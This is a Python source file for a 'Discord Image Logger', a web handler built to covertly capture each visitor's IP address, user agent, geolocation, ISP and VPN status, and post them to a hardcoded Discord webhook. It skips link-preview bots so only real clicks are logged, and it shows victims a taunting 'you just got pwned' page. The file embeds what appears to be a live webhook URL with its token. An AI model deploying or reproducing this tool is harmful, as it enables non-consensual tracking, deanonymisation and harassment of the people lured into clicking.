# Discord Image Logger (modified for clean embed message)
from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

config = {
    "webhook": "https://discord.com/api/webhooks/1393720989015343254/a5NFm_FVIpaySO7cTlYYwXZpu7FcVOBBOVpjNKN9MCTRtp7KvwUaAbIZ6GTZ-1vzSz8H",
    "username": "Image Logger",
    "color": 0x00FFFF,
    "message": {
        "doMessage": True,
        "message": "You just got pwned by the creator of this site!\n\nDon't go around clicking random links or forget your VPN — next time might not be so safe ;)"
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    }
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }]
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A"):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }]
            })
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent)

    embed_description = (
        f"**You just got pwned by the creator of this site!**\n\n"
        f"**Endpoint:** `{endpoint}`\n\n"
        f"**IP Info:**\n"
        f"> **IP:** `{ip if ip else 'Unknown'}`\n"
        f"> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`\n"
        f"> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`\n"
        f"> **Country:** `{info['country'] if info['country'] else 'Unknown'}`\n"
        f"> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`\n"
        f"> **City:** `{info['city'] if info['city'] else 'Unknown'}`\n"
        f"> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` "
        f"({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++'+coords+')'})\n"
        f"> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`\n"
        f"> **Mobile:** `{info['mobile']}`\n"
        f"> **VPN:** `{info['proxy']}`\n"
        f"> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`\n\n"
        f"**PC Info:**\n"
        f"> **OS:** `{os}`\n"
        f"> **Browser:** `{browser}`\n\n"
        f"**User Agent:** `{useragent}`\n\n"
        f"Don't go around clicking random links or forget your VPN — next time might not be so safe ;)"
    )

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": embed_description,
        }]
    }

    requests.post(config["webhook"], json=embed)
    return info

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            ip = self.headers.get('x-forwarded-for') or self.client_address[0]
            useragent = self.headers.get('user-agent')

            if ip.startswith(blacklistedIPs):
                return

            bot = botCheck(ip, useragent)
            if bot:
                # If it's a bot, just return 200 OK with no content
                self.send_response(200)
                self.end_headers()
                return

            # Report the IP info
            makeReport(ip, useragent, endpoint=self.path)

            # Respond with a simple message page
            message = config["message"]["message"]
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(f"<html><body><h1>{message}</h1></body></html>".encode())

        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(traceback.format_exc())

        return

    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
